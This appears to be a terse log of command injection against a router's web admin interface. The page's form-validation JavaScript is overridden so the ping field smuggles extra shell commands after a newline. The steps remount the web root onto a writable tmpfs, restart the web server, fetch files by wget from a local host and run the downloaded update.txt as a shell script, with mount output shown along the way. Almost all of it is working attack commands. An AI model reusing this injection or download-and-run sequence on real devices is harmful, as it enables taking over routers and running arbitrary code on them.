validForm = function(){document.form.SystemCmd.value = "ping\necho hello world";return true;}

validForm = function(){document.form.SystemCmd.value = "ping\nmount -t tmpfs tmpfs userRpm";return true;}
validForm = function(){document.form.SystemCmd.value = "ping\nmount";return true;}

rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
devtmpfs on /dev type devtmpfs (rw,relatime,size=127744k,nr_inodes=31936,mode=755)
proc on /proc type proc (rw,relatime)
tmpfs on /tmp type tmpfs (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
/dev/mtdblock6 on /jffs type jffs2 (rw,noatime)
/dev/mtdblock7 on /T-Mobile type jffs2 (ro,relatime)
usbfs on /proc/bus/usb type usbfs (rw,relatime)
tmpfs on /www/userRpm type tmpfs (rw,relatime)

validForm = function(){document.form.SystemCmd.value = "ping\ncp -a . userRpm";return true;}
# cp: recursion detected, omitting directory "./userRpm

validForm = function(){document.form.SystemCmd.value = "ping\nmount --move userRpm .";return true;}
validForm = function(){document.form.SystemCmd.value = "ping\nmount";return true;}

rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
devtmpfs on /dev type devtmpfs (rw,relatime,size=127744k,nr_inodes=31936,mode=755)
proc on /proc type proc (rw,relatime)
tmpfs on /tmp type tmpfs (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
/dev/mtdblock6 on /jffs type jffs2 (rw,noatime)
/dev/mtdblock7 on /T-Mobile type jffs2 (ro,relatime)
usbfs on /proc/bus/usb type usbfs (rw,relatime)
tmpfs on /www type tmpfs (rw,relatime)

validForm = function(){document.form.SystemCmd.value = "ping\nservice restart_httpd";return true;}

Done.

validForm = function(){document.form.SystemCmd.value = "ping\nwget -A txt -t 2 -r -nH -nd 192.168.29.5";return true;}

# 

validForm = function(){document.form.SystemCmd.value = "ping\n. update.txt";return true;}
